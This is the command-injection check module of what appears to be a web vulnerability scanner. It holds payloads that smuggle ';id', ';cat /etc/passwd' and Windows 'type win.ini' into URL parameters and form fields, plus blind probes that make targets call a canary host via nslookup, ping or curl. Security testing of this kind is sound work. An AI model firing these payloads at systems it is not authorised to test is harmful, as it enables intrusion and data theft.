import httpx
from typing import List
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.http import get_url_params, inject_url_param, fetch
from scanner.utils.payloads import load_payloads

_HARDCODED = [
    (";id", ["uid=", "gid=", "groups="]),
    ("|id", ["uid=", "gid=", "groups="]),
    ("$(id)", ["uid=", "gid=", "groups="]),
    ("`id`", ["uid=", "gid=", "groups="]),
    (";whoami", ["root", "www-data", "apache", "nginx", "nobody"]),
    ("|whoami", ["root", "www-data", "apache", "nginx", "nobody"]),
    ("& whoami &", ["root", "www-data", "apache", "nginx"]),
    (";cat /etc/passwd", ["root:x:", "daemon:x:"]),
    ("| cat /etc/passwd", ["root:x:", "daemon:x:"]),
    # Windows
    ("& dir &", ["Volume in drive", "Directory of", "bytes free"]),
    ("| type C:\\Windows\\win.ini", ["[extensions]", "for 16-bit"]),
]

def _get_payloads() -> List[tuple]:
    data = load_payloads("cmd_injection")
    if data and isinstance(data.get("payloads"), list):
        try:
            return [(p["payload"], p["signatures"]) for p in data["payloads"]]
        except (KeyError, TypeError):
            pass
    return _HARDCODED

# Pairs of (payload, expected_output_signatures)
PAYLOADS = _get_payloads()


def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
    findings = []
    _test_url_params(page, client, findings)
    _test_forms(page, client, findings)

    # Blind command injection via OOB DNS lookup
    if oob and not findings:
        canary = oob.get_canary()
        blind_payloads = [
            f";nslookup {canary}",
            f"|nslookup {canary}",
            f"$(nslookup {canary})",
            f";curl -s http://{canary}/cmd",
            f"|curl -s http://{canary}/cmd",
            f"& nslookup {canary} &",
            f"\n ping -c 1 {canary}\n",
        ]
        from scanner.utils.http import get_url_params, inject_url_param
        params = get_url_params(page.url)
        for param_name in params:
            for payload in blind_payloads:
                test_url = inject_url_param(page.url, param_name, payload)
                try:
                    client.get(test_url, timeout=5)
                except Exception:
                    pass
        for form in page.forms:
            for inp in form["inputs"]:
                if not inp["name"]:
                    continue
                for payload in blind_payloads[:3]:
                    data = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
                    data[inp["name"]] = payload
                    try:
                        client.request(form["method"].upper(), form["action"], data=data, timeout=5)
                    except Exception:
                        pass

    return findings


def _test_url_params(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    params = get_url_params(page.url)
    for param_name in params:
        for payload, signatures in PAYLOADS:
            test_url = inject_url_param(page.url, param_name, payload)
            resp = fetch(client, "get", test_url)
            matched = _match_signatures(resp, signatures) if resp else None
            if matched:
                findings.append(_finding(page.url, param_name, payload, matched))
                break


def _test_forms(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    for form in page.forms:
        input_names = [i["name"] for i in form["inputs"] if i["name"]]
        if not input_names:
            continue
        for payload, signatures in PAYLOADS:
            data = {name: payload for name in input_names}
            resp = fetch(client, form["method"], form["action"], data)
            matched = _match_signatures(resp, signatures) if resp else None
            if matched:
                findings.append(_finding(form["action"], input_names[0], payload, matched))
                break


def _match_signatures(resp, signatures: list) -> str | None:
    if not resp:
        return None
    body = resp.text
    return next((s for s in signatures if s in body), None)


def _finding(url: str, param: str, payload: str, matched: str) -> Finding:
    return Finding(
        title="OS Command Injection",
        severity=Severity.CRITICAL,
        url=url,
        parameter=param,
        payload=payload,
        evidence=f"Command output signature '{matched}' detected in response",
        description=(
            "OS command injection allows attackers to execute arbitrary commands on the server, "
            "leading to full system compromise, data exfiltration, and lateral movement."
        ),
        remediation=(
            "Never pass user input to shell commands. Use language-native APIs instead of shell. "
            "If shell is unavoidable, use an allowlist and escape all arguments."
        ),
        cwe="CWE-78",
        cvss=9.8,
        owasp_category="A03:2021 Injection",
        standards=["ISO27001-8.23", "HIPAA-164.312a", "GDPR-Art32"],
        confidence=1.0,
    )
